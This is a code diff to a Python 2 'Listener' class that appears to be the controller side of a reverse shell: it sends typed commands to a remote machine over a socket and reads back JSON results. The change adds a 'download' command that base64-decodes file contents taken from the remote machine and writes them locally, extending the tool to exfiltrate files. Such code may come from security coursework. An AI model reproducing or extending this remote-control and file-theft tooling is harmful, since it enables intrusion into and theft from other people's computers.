@@ -6,6 +6,7 @@
 
 import socket
 import json
+import base64
 
 class Listener:
     def __init__(self,ip,port):
@@ -27,7 +28,7 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(2048)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -39,6 +40,11 @@ class Listener:
             exit()
         return self.reliable_recv()
 
+    def write_file(self,path,content):
+        with open(path,"wb") as target_file:
+            target_file.write(base64.b64decode(content))
+            return "[+] Download Successful."
+
     def run(self):
         while True:
             cmd = raw_input(">> ")
@@ -46,6 +52,8 @@ class Listener:
                 continue
             cmd = cmd.split(" ")
             result = self.exec_remote(cmd)
+            if cmd[0] == "download" and len(cmd) > 1:
+                result = self.write_file(cmd[1],result)
             print result
 
 
